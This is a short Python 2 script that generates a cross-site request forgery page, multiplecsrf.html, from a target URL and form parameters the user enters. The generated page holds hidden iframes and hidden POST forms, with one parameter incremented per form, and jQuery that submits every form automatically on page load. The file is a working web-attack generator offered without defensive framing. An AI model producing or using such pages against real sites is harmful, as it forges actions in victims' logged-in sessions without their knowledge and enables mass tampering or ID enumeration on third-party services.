form = ""
cnt = int(raw_input("Number of CSRF Form Parameters :   "))

dictionary = {}
url = raw_input("The Url  :   ")
for i in range(cnt) :
	paramName = raw_input(str(i+1)+". Param Name  :    ")
	paramValue = raw_input(str(i+1)+". Param Value :    ")
	dictionary[paramName]=paramValue
print dictionary
incrementalName = raw_input("Param Value :    ")
incrementalCounter = int(raw_input("Number of Increment :    "))

form = form +  '<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>'
form = form + '\n\n\n'
for i in range(incrementalCounter):
	form = form + '<iframe style="display:none" name="csrf-frame'+str(i)+'"></iframe>'
	form = form + '\n'

form = form + '\n'
form = form + '\n'
for i in range(incrementalCounter):
	form=form  + '<form method="POST" id="form'+str(i)+'" target="csrf-frame'+str(i)+'" action="'+url+'">'
	form = form + '\n'
	for k, v in dictionary.items():
		if k != incrementalName:
			form=form  + '          <input type="hidden" name="'+k+'" value="'+v+'" />'
			form = form + '\n'
		else:		
			form=form  + '          <input type="hidden" name="'+k+'" value="'+str(int(v)+i)+'" />'
			form = form + '\n'
	form=form  + '</form>'
	form = form + '\n'

form = form + '<script>'
form = form + '\n'

for i in range(incrementalCounter):
	form=form  + '$(document).ready(function(){'
	form = form + '\n'
	form = form + '     $("#form'+str(i)+'").submit();'
	form = form + '\n'
	form=form  + '});'
	form = form + '\n'


form = form + '</script>'
form = form + '\n'

print " #################        multiplecsrf.html form is created !   ##################"
file = open("multiplecsrf.html","w") 
file.write(form) 
file.close() 
